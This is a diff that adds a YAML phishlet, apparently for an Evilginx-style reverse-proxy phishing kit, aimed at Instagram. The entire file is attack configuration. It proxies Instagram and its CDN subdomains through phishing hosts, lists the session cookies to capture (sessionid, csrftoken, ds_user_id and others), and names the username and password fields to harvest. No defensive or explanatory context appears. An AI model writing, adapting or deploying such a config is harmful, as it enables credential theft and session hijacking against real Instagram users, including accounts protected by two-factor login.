@@ -1,0 +1,24 @@
+name: 'Instagram-Pro'
+target_domain: 'www.instagram.com'
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com' }
+  - { phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com' }
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'instagram.com' }
+  - { phish_sub: 'graph', orig_sub: 'graph', domain: 'instagram.com' }
+  - { phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com' }
+  - { phish_sub: 'z-p3-static', orig_sub: 'z-p3-static', domain: 'cdninstagram.com' }
+  - { phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com' }
+
+auth_tokens:
+  - 'sessionid'
+  - 'ds_user_id'
+  - 'csrftoken'
+  - 'rur'
+  - 'mid'
+  - 'ig_did'
+
+creds_fields:
+  - 'username'
+  - 'password'
+  - 'emailOrPhone'
+  - 'enc_password'
